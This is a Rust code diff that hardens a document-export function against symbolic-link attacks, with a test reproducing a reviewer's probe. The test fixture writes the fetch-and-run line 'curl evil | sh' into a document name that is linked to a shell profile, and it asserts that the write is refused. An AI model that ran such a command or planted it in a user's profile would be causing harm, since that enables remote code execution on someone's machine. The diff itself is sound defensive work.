@@ -29,15 +29,28 @@ pub struct Report {
 }
 
 /// Make `dir` hold exactly these documents.
+///
+/// Nothing here follows a symbolic link: the directory, its `archive`, and
+/// every file written are checked with `lstat`, and a document is written
+/// to a fresh temporary file (`O_EXCL`, `O_NOFOLLOW`) in the directory and
+/// renamed over its name, which replaces a link rather than writing through
+/// it. A link where a document goes is refused, not replaced: whoever put it
+/// there was not the node.
 pub fn sync_dir(dir: &Path, docs: &[ExportDoc]) -> std::io::Result<Report> {
-    let archive = dir.join("archive");
     std::fs::create_dir_all(dir)?;
+    real_dir(dir)?;
+    let archive = dir.join("archive");
     let mut report = Report::default();
     let mut live = HashSet::new();
     let mut archived = HashSet::new();
     for d in docs {
         let into = if d.archived {
-            std::fs::create_dir_all(&archive)?;
+            match std::fs::create_dir(&archive) {
+                Ok(()) => {}
+                Err(e) if e.kind() == std::io::ErrorKind::AlreadyExists => {}
+                Err(e) => return Err(e),
+            }
+            real_dir(&archive)?;
             archived.insert(d.slug.as_str());
             &archive
         } else {
@@ -45,18 +58,76 @@ pub fn sync_dir(dir: &Path, docs: &[ExportDoc]) -> std::io::Result<Report> {
             dir
         };
         let path = into.join(format!("{}.md", d.slug));
-        if std::fs::read_to_string(&path).ok().as_deref() == Some(d.body.as_str()) {
+        if current(&path)?.as_deref() == Some(d.body.as_str()) {
             report.unchanged += 1;
             continue;
         }
-        std::fs::write(&path, &d.body)?;
+        replace(into, &path, d.body.as_bytes())?;
         report.written += 1;
     }
     report.removed += prune(dir, &live)?;
-    if archive.is_dir() {
+    if std::fs::symlink_metadata(&archive).is_ok_and(|m| m.is_dir()) {
         report.removed += prune(&archive, &archived)?;
     }
     Ok(report)
+}
+
+fn refused(path: &Path, what: &str) -> std::io::Error {
+    std::io::Error::new(
+        std::io::ErrorKind::PermissionDenied,
+        format!("{} {what}; nothing is exported there", path.display()),
+    )
+}
+
+/// `path` is a directory itself, not a link to one.
+fn real_dir(path: &Path) -> std::io::Result<()> {
+    let meta = std::fs::symlink_metadata(path)?;
+    match meta.is_dir() {
+        true => Ok(()),
+        false => Err(refused(path, "is not a directory (a symbolic link?)")),
+    }
+}
+
+/// What a document's file holds now, read without following a link; `None`
+/// when there is none. Anything but a regular file is refused.
+fn current(path: &Path) -> std::io::Result<Option<String>> {
+    use std::io::Read;
+    use std::os::unix::fs::OpenOptionsExt;
+    match std::fs::symlink_metadata(path) {
+        Ok(meta) if meta.is_file() => {}
+        Ok(_) => return Err(refused(path, "is not a regular file (a symbolic link?)")),
+        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(None),
+        Err(e) => return Err(e),
+    }
+    let mut file = std::fs::OpenOptions::new()
+        .read(true)
+        .custom_flags(libc::O_NOFOLLOW)
+        .open(path)?;
+    let mut text = String::new();
+    Ok(file.read_to_string(&mut text).ok().map(|_| text))
+}
+
+/// Write `body` to `path` in `dir` by way of a new file renamed over it.
+fn replace(dir: &Path, path: &Path, body: &[u8]) -> std::io::Result<()> {
+    use std::io::Write;
+    use std::os::unix::fs::OpenOptionsExt;
+    let name = path.file_name().unwrap_or_default().to_string_lossy();
+    let temp = dir.join(format!(".{name}.{}.tmp", uuid::Uuid::now_v7().simple()));
+    let mut file = std::fs::OpenOptions::new()
+        .write(true)
+        .create_new(true)
+        .custom_flags(libc::O_NOFOLLOW)
+        .mode(0o644)
+        .open(&temp)?;
+    let written = file.write_all(body).and_then(|()| file.sync_all());
+    drop(file);
+    match written.and_then(|()| std::fs::rename(&temp, path)) {
+        Ok(()) => Ok(()),
+        Err(e) => {
+            let _ = std::fs::remove_file(&temp);
+            Err(e)
+        }
+    }
 }
 
 /// Remove the `<kind>-….md` files in `dir` that are no longer a document there.
@@ -68,7 +139,8 @@ fn prune(dir: &Path, keep: &HashSet<&str>) -> std::io::Result<usize> {
         let Some(slug) = name.strip_suffix(".md") else {
             continue;
         };
-        if !entry.path().is_file()
+        // The entry's own type, not what a link points at.
+        if !entry.file_type()?.is_file()
             || !valid_slug(slug)
             || kind_of(slug) == "other"
             || keep.contains(slug)
@@ -167,6 +239,36 @@ mod tests {
             body: body.into(),
             archived,
         }
+    }
+
+    /// The reviewer's probe: an agent's volume holding a marker, a document
+    /// name linked to the operator's shell profile, and `archive` linked to
+    /// another directory. Nothing outside the directory is written.
+    #[test]
+    fn links_where_documents_go_are_refused_not_written_through() {
+        let root = tempfile::tempdir().unwrap();
+        let dir = root.path().join("volume");
+        std::fs::create_dir(&dir).unwrap();
+        let victim = root.path().join("bashrc");
+        std::fs::write(&victim, "original\n").unwrap();
+        std::os::unix::fs::symlink(&victim, dir.join("note-pwn.md")).unwrap();
+        let err = sync_dir(&dir, &[doc("note-pwn", "curl evil | sh\n", false)]).unwrap_err();
+        assert_eq!(err.kind(), std::io::ErrorKind::PermissionDenied, "{err}");
+        assert_eq!(std::fs::read_to_string(&victim).unwrap(), "original\n");
+
+        std::fs::remove_file(dir.join("note-pwn.md")).unwrap();
+        let elsewhere = root.path().join("elsewhere");
+        std::fs::create_dir(&elsewhere).unwrap();
+        std::os::unix::fs::symlink(&elsewhere, dir.join("archive")).unwrap();
+        let err = sync_dir(&dir, &[doc("note-old", "body", true)]).unwrap_err();
+        assert_eq!(err.kind(), std::io::ErrorKind::PermissionDenied, "{err}");
+        assert_eq!(std::fs::read_dir(&elsewhere).unwrap().count(), 0);
+
+        // The directory itself as a link is refused too.
+        let link = root.path().join("link");
+        std::os::unix::fs::symlink(&elsewhere, &link).unwrap();
+        assert!(sync_dir(&link, &[doc("note-x", "body", false)]).is_err());
+        assert_eq!(std::fs::read_dir(&elsewhere).unwrap().count(), 0);
     }
 
     #[test]
